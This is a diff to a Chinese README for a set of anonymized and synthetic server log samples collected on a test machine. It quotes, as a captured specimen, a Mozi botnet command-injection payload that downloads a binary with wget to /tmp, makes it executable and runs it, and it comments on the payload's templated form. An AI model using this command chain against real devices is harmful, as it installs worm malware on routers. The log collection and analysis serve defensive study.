@@ -61,3 +61,18 @@ python tools/anonymize_log.py 原始.log -o samples/xxx.sample.log
 其中第 1 条抓到的最严重的样本是一个 **Mozi 僵尸网络**载荷：
 `27;wget http://%s:%d/Mozi.m -O -> /tmp/Mozi.m;chmod 777 /tmp/Mozi.m;/tmp/Mozi.m dlink.mips`
 ——针对 D-Link 路由器的 IoT 蠕虫，用 `;` 分隔命令链下发。这种载荷模板里带 `%s:%d` 占位符，说明是**批量生成**的，不是人在手打。
+
+---
+
+## 文件说明
+
+| 文件 | 来源 | 说明 |
+|---|---|---|
+| `access_2026-10-15.synthetic.log` | 构造 | 12 行的最小演示样本，用来跑通流程，不是真实流量 |
+| `auth_2026-10-15.synthetic.log` | 构造 | 同上，auth.log 版本 |
+| `access_2026-11-10.sample.log` | 真实 | 公网测试机首夜，已脱敏 |
+| `access_2026-11-11.sample.log` | 真实 | 公网测试机累计观测，已脱敏 |
+| `auth_2026-11-11.sample.log` | 真实 | 同上 |
+
+文件名里带 `synthetic` 的是构造数据，带 `sample` 的是真实流量脱敏后。
+**这个区分很重要**：拿构造数据算出 100% 检出率不说明任何问题。
